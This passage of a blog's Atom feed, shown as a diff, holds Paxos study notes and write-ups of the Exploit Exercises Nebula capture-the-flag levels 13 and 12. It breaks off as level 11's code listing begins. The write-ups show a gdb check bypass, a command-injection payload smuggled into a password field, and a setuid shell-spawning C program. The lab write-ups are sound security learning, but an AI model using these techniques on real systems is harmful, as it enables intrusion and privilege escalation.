+<li>The proposer can issue a proposal with number <em>n</em> and <em>v</em> if it
+receives responses from a majority of the acceptors, where <em>v</em> is the
+value of the highest-numbered proposal among the responses, or is any
+value if responders reported no proposals.</li>
+</ol>
+
+
+<p>The request in step 1 is a <em>prepare</em> request, and that in step 2 is
+an <em>accept</em> request.</p>
+
+<p><strong>How an acceptor responds to requests?</strong>
+It can always respond to a <em>prepare</em> request, and it can respond to an
+<em>accept</em> request iff it has not promised not to.</p>
+
+<blockquote><p>P1a. An acceptor can accept a proposal numbered <em>n</em> iff it has not
+responded to a prepare request having a number greater than <em>n</em>.</p></blockquote>
+
+<p>An acceptor needs to remember only the highest-numbered proposal that
+it has ever accepted and the number of the highest-numbered prepare
+request to which it has responded.</p>
+
+<p><strong>Note that the proposer can always abandon a proposal and forget all about it—as long as it never tries to issue another proposal with the same number. What if a proposer got a promise but never issued?</strong>
+Just like a network package lose. Will be eventually replaced by
+other proposals.</p>
+
+<p><strong>Phase 1.</strong>
+<strong>(a)</strong> A proposer selects a proposal number <em>n</em> and sends a <em>prepare</em>
+request with number <em>n</em> to a majority of acceptors.
+<strong>(b)</strong> If an acceptor receives a <em>prepare</em> request with number <em>n</em> greater
+than that of any <em>prepare</em> request to which it has already responded,
+then it responds to the request with a promise not to accept any more
+proposals numbered less than <em>n</em> and with the highest-numbered proposal
+(if any) that it has accepted.</p>
+
+<p><strong>Phase 2.</strong>
+<strong>(a)</strong> If the proposer receives a response to its <em>prepare</em> requests
+(numbered <em>n</em>) from a majority of acceptors, then it sends an <em>accept</em>
+request to each of those acceptors for a proposal numbered <em>n</em> with a
+value <em>v</em> , where <em>v</em> is the value of the highest-numbered proposal
+among the responses, or is any value if the responses reported no
+proposals.
+<strong>(b)</strong> If an acceptor receives an <em>accept</em> request for a proposal numbered
+<em>n</em>, it accepts the proposal unless it has already responded to a
+<em>prepare</em> request having a number greater than <em>n</em>.</p>
+
+<p><strong>Optimization</strong>: abandon a proposal if some proposers has begun trying to
+issue a higher-numbered one.</p>
+
+<h3>Learning a Chosen Value</h3>
+
+<p>Acceptors return responds to <em>accept</em> requests to all the learners,
+the number of responds that required equals to the product of the number
+of acceptors and the number of learners.</p>
+
+<p>Acceptors could return only to a set of distinguished learners, these
+learners will inform other learners.</p>
+
+<h3>Progress</h3>
+
+<p>It’s easy to construct a scenario in which two proposers each keep
+issuing a sequence of proposals with increasing numbers, none of which
+are ever chosen.</p>
+
+<p>To guarantee progress, a distinguished proposer must be selected as the
+only one to try issuing proposals.</p>
+
+<p>Result of <a href="http://dl.acm.org/citation.cfm?id=214121">Fischer, Lynch, and Patterson</a> shows a reliable algorithm
+to electing a proposer must use either randomness or real time.</p>
+
+<h3>Implementation</h3>
+
+<p><a href="http://dl.acm.org/citation.cfm?id=279229">The part-time parliament</a></p>
+
+<p><strong>No two proposals are ever issued with the same number?</strong>
+Different proposers choose their numbers from disjoint sets of numbers,
+each proposer remembers (in stable storage) the highest-numbered
+proposal it has tried to issue.</p>
+
+<h2>My Summary</h2>
+
+<p>Behavior of <em>Proposer</em>, <em>Acceptor</em> and <em>Learner</em></p>
+
+<h3>Proposer</h3>
+
+<ol>
+<li>sends prepare request <em>n</em> to all acceptors</li>
+<li>after receives responds from majority of acceptors, choose a value <em>v</em> according to responds
+
+<ol>
+<li><em>v</em> should be the value of the highest-numberd proposal in those responds</li>
+<li>if none of responds returns any proposal, use arbitrary value</li>
+<li>if any responds contains an error or a proposal whose number is bigger than <em>n</em>, go to next step</li>
+</ol>
+</li>
+<li>repick a bigger <em>n</em> and repeat step 1 &amp; 2 until a value is chosen</li>
+</ol>
+
+
+<h3>Acceptor</h3>
+
+<ol>
+<li>Acceptor should know the highest-numbered proposal it accepted <em>APa</em> and the highest-numbered proposal it responsed <em>APr</em></li>
+<li>Upon receiving a prepare request <em>P</em>, compare <em>P.n</em> with <em>APr.n</em>
+
+<ol>
+<li>if <em>P.n</em> > <em>APr.n</em>, respond a promise and <em>APa</em>, then change <em>APr</em> to <em>P</em></li>
+<li>if <em>P.n</em> &lt;= <em>APr.n</em>, respond with some error or <em>APr</em>?</li>
+</ol>
+</li>
+<li>Upon receiving a accept request <em>P</em>
+
+<ol>
+<li>if <em>P.n</em> >= <em>APr.n</em>, accept it by making <em>APa</em> equals to <em>P</em></li>
+<li>if <em>P.n</em> &lt; <em>APr.n</em>, abondon it</li>
+</ol>
+</li>
+</ol>
+
+
+<h3>Learner</h3>
+
+<p>TODO</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 13]]></title>
+    <link href="http://hanjc.me/blog/2014/01/26/nebula-level13/"/>
+    <updated>2014-01-26T21:54:12+08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/26/nebula-level13</id>
+    <content type="html"><![CDATA[<h3>About</h3>
+
+<p>There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.</p>
+
+<p>To do this level, log in as the <em>level13</em> account with the password <em>level13</em> . Files for this level can be found in /home/flag13.</p>
+
+<!-- more -->
+
+
+<h3>Source code</h3>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#define FAKEUID 1000</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">c</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">token</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">!=</span> <span class="n">FAKEUID</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Security failure detected. UID %d started us, we expect %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">getuid</span><span class="p">(),</span> <span class="n">FAKEUID</span><span class="p">);</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;The system administrators will be notified of this violation</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="c1">// snip, sorry :)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;your token is %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">token</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Solution</h3>
+
+<p>There is no way for me to be uid 1000, but this executable which contains the token is right here, we cannot be stopped by a simple <code>if</code> branch.</p>
+
+<p>Disassemble the executable <em>flag13</em></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>level13@nebula:~<span class="nv">$ </span>objdump -D /home/flag13/flag13 &gt; /home/level13/flag13.asm
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Go to the instruction corresponding to the last <em>printf()</em> in the c code, I thought I could read the password out directly from the memory location where <em>token</em> is stored. Turned out that <em>token</em> is calculated with mass of code. Well, as I cannot read the password directly, I could always change the execution flow and let the program print that out.</p>
+
+<figure class='code'><figcaption><span>flag13.asm</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class='text'><span class='line'>080484c4 &lt;main&gt;:
+</span><span class='line'> 80484c4:       55                      push   %ebp
+</span><span class='line'> 80484c5:       89 e5                   mov    %esp,%ebp
+</span><span class='line'> 80484c7:       57                      push   %edi
+</span><span class='line'> 80484c8:       53                      push   %ebx
+</span><span class='line'> 80484c9:       83 e4 f0                and    $0xfffffff0,%esp
+</span><span class='line'> 80484cc:       81 ec 30 01 00 00       sub    $0x130,%esp
+</span><span class='line'> 80484d2:       8b 45 0c                mov    0xc(%ebp),%eax
+</span><span class='line'> 80484d5:       89 44 24 1c             mov    %eax,0x1c(%esp)
+</span><span class='line'> 80484d9:       8b 45 10                mov    0x10(%ebp),%eax
+</span><span class='line'> 80484dc:       89 44 24 18             mov    %eax,0x18(%esp)
+</span><span class='line'> 80484e0:       65 a1 14 00 00 00       mov    %gs:0x14,%eax
+</span><span class='line'> 80484e6:       89 84 24 2c 01 00 00    mov    %eax,0x12c(%esp)
+</span><span class='line'> 80484ed:       31 c0                   xor    %eax,%eax
+</span><span class='line'> 80484ef:       e8 cc fe ff ff          call   80483c0 &lt;getuid@plt&gt;
+</span><span class='line'> 80484f4:       3d e8 03 00 00          cmp    $0x3e8,%eax
+</span><span class='line'> 80484f9:       74 36                   je     8048531 &lt;main+0x6d&gt;
+</span><span class='line'> 80484fb:       e8 c0 fe ff ff          call   80483c0 &lt;getuid@plt&gt;
+</span><span class='line'> 8048500:       ba d0 86 04 08          mov    $0x80486d0,%edx
+</span><span class='line'> 8048505:       c7 44 24 08 e8 03 00    movl   $0x3e8,0x8(%esp)
+</span><span class='line'>...
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is the snippet of function <em>main()</em>, note that line 16 compare <em>%eax</em> (which is the return value of function call <em>getuid()</em>) with <em>0x3e8</em>, and line 17 will jump to memory location 0x8048531 if they are equal.</p>
+
+<p>In a normal execution, these are apparantly not equal, but we could make it equal with <em>gdb</em>.</p>
+
+<ol>
+<li>copy <em>flag13</em> into /home/level13</li>
+<li>start it with <em>gdb</em></li>
+<li>set a break point at 0x80484f4, which is the instruction to compare</li>
+<li>run the program</li>
+<li>modify %eax to 1000 at the break point</li>
+<li>continue run the program</li>
+</ol>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># start flag13 with gdb</span>
+</span><span class='line'>level13@nebula:~<span class="nv">$ </span>gdb flag13
+</span><span class='line'><span class="c"># set break point and run</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> b *0x80484f4
+</span><span class='line'>Breakpoint 1 at 0x80484f4
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run
+</span><span class='line'>Starting program: /home/level13/flag13
+</span><span class='line'><span class="c"># reach break point, let&#39;s take a look at where we are</span>
+</span><span class='line'>Breakpoint 1, 0x080484f4 in main <span class="o">()</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> disassemble
+</span><span class='line'>Dump of assembler code <span class="k">for function </span>main:
+</span><span class='line'>   0x080484e0 &lt;+28&gt;:    mov    %gs:0x14,%eax
+</span><span class='line'>   0x080484e6 &lt;+34&gt;:    mov    %eax,0x12c<span class="o">(</span>%esp<span class="o">)</span>
+</span><span class='line'>   0x080484ed &lt;+41&gt;:    xor    %eax,%eax
+</span><span class='line'>   0x080484ef &lt;+43&gt;:    call   0x80483c0 &lt;getuid@plt&gt;
+</span><span class='line'><span class="o">=</span>&gt; 0x080484f4 &lt;+48&gt;:    cmp    <span class="nv">$0x3e8</span>,%eax
+</span><span class='line'>   0x080484f9 &lt;+53&gt;:    je     0x8048531 &lt;main+109&gt;
+</span><span class='line'>   0x080484fb &lt;+55&gt;:    call   0x80483c0 &lt;getuid@plt&gt;
+</span><span class='line'><span class="c"># here we print the registers out, %eax is 1014</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> i r
+</span><span class='line'>eax            0x3f6    1014
+</span><span class='line'>ecx            0xbffff804       -1073743868
+</span><span class='line'>...
+</span><span class='line'><span class="c"># change %eax</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> <span class="nv">$eax</span><span class="o">=</span>1000
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> i r
+</span><span class='line'>eax            0x3e8    1000
+</span><span class='line'>ecx            0xbffff804       -1073743868
+</span><span class='line'>...
+</span><span class='line'><span class="c"># continue execution </span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> <span class="k">continue</span>
+</span><span class='line'>Continuing.
+</span><span class='line'>your token is b705702b-76a8-42b0-8844-3adabbe5ac58
+</span><span class='line'><span class="o">[</span>Inferior 1 <span class="o">(</span>process 31018<span class="o">)</span> exited with code 063<span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now <em>su</em> to <em>flag13</em> with the token.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 12]]></title>
+    <link href="http://hanjc.me/blog/2014/01/26/nebula-level12/"/>
+    <updated>2014-01-26T20:12:53+08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/26/nebula-level12</id>
+    <content type="html"><![CDATA[<h3>About</h3>
+
+<p>There is a backdoor process listening on port 50001.</p>
+
+<p>To do this level, log in as the <em>level12</em> account with the password <em>level12</em>. Files for this level can be found in /home/flag12.</p>
+
+<!-- more -->
+
+
+<h3>Source code</h3>
+
+<figure class='code'><figcaption><span>/home/flag12/flag12.lua</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class='lua'><span class='line'><span class="kd">local</span> <span class="n">socketlocal</span> <span class="n">socket</span> <span class="o">=</span> <span class="nb">require</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">socket&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="kd">local</span> <span class="n">server</span> <span class="o">=</span> <span class="nb">assert</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">bind</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">127.0.0.1&quot;</span><span class="p">,</span> <span class="mi">50001</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">function</span> <span class="nf">hash</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">prog</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">echo &quot;</span><span class="o">..</span><span class="n">password</span><span class="o">..</span><span class="s2">&quot;</span><span class="s"> | sha1sum&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">r&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">prog</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">*all&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">prog</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="nb">string.sub</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">40</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="n">data</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="k">while</span> <span class="mi">1</span> <span class="k">do</span>
+</span><span class='line'>  <span class="kd">local</span> <span class="n">client</span> <span class="o">=</span> <span class="n">server</span><span class="p">:</span><span class="n">accept</span><span class="p">()</span>
+</span><span class='line'>  <span class="n">client</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Password: &quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">client</span><span class="p">:</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
+</span><span class='line'>  <span class="kd">local</span> <span class="n">line</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">client</span><span class="p">:</span><span class="n">receive</span><span class="p">()</span>
+</span><span class='line'>  <span class="k">if</span> <span class="ow">not</span> <span class="n">err</span> <span class="k">then</span>
+</span><span class='line'>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">trying &quot;</span> <span class="o">..</span> <span class="n">line</span><span class="p">)</span> <span class="c1">-- log from where ;\</span>
+</span><span class='line'>    <span class="kd">local</span> <span class="n">h</span> <span class="o">=</span> <span class="n">hash</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">if</span> <span class="n">h</span> <span class="o">~=</span> <span class="s2">&quot;</span><span class="s">4754a4f4bd5787accd33de887b9250a0691dd198&quot;</span> <span class="k">then</span>
+</span><span class='line'>      <span class="n">client</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Better luck next time</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">else</span>
+</span><span class='line'>      <span class="n">client</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Congrats, your token is 413**CARRIER LOST**</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">client</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'><span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Solution</h3>
+
+<p><code>prog = io.popen("echo "..password.." | sha1sum", "r")</code> this line of code in <em>hash()</em> function try to calc the hash of the password, but we can execute any command with a well structed <em>password</em>.</p>
+
+<p>Write a simple Ruby script to send command to server, here I construct a <em>password</em> to make the server build a <em>drop.c</em> file into directory /home/flag12.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">server</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span> <span class="mi">50001</span><span class="p">)</span>
+</span><span class='line'><span class="n">server</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="s2">&quot;hello &amp;&amp; gcc -o /home/flag12/flag12 /tmp/drop.c &amp;&amp; chmod 777 /home/flag12/flag12 &amp;&amp; chmod +s /home/flag12/flag12 &amp;&amp; echo hello &quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">ret</span> <span class="o">=</span> <span class="n">server</span><span class="o">.</span><span class="n">gets</span><span class="o">.</span><span class="n">chomp</span>
+</span><span class='line'><span class="nb">puts</span> <span class="s2">&quot;</span><span class="si">#{</span><span class="n">ret</span><span class="si">}</span><span class="s2">&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Remenber the piece of C code we used to drop privilege? Here it is again:</p>
+
+<figure class='code'><figcaption><span>/tmp/drop.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>  <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">execv</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Run the Ruby script, I got</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>level12@nebula:~<span class="nv">$ </span>ruby client.rb
+</span><span class='line'>Password: Better luck next <span class="nb">time</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It is all right, I have no interest in the password anyway. Take a look at the directory /home/flag12</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>flag12@nebula:~<span class="nv">$ </span>ll /home/flag12
+</span><span class='line'>total 14
+</span><span class='line'>drwxr-x--- 1 flag12 level12   60 2014-03-02 22:45 ./
+</span><span class='line'>drwxr-xr-x 1 root   root     280 2012-08-27 07:18 ../
+</span><span class='line'>-rw-r--r-- 1 flag12 flag12   220 2011-05-18 02:54 .bash_logout
+</span><span class='line'>-rw-r--r-- 1 flag12 flag12  3353 2011-05-18 02:54 .bashrc
+</span><span class='line'>-rwsrwsrwx 1 flag12 flag12  7322 2014-03-02 22:45 flag12*
+</span><span class='line'>-rw-r--r-- 1 root   root     685 2011-11-20 21:22 flag12.lua
+</span><span class='line'>-rw-r--r-- 1 flag12 flag12   675 2011-05-18 02:54 .profile
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here is the executable <em>flag12</em> with Set-User-ID bit, run it and a bash with <em>flag12</em> user privilege will show up!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 11]]></title>
+    <link href="http://hanjc.me/blog/2014/01/26/nebula-level11/"/>
+    <updated>2014-01-26T16:44:20+08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/26/nebula-level11</id>
+    <content type="html"><![CDATA[<h3>About</h3>
+
+<p>The <em>/home/flag11/flag11</em> binary processes standard input and executes a shell command.</p>
+
+<p>There are two ways of completing this level, you may wish to do both :&ndash;)</p>
+
+<p>To do this level, log in as the <em>level11</em> account with the password <em>level11</em> . Files for this level can be found in /home/flag11.</p>
+
+<!-- more -->
+
+
+<h3>Source code</h3>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
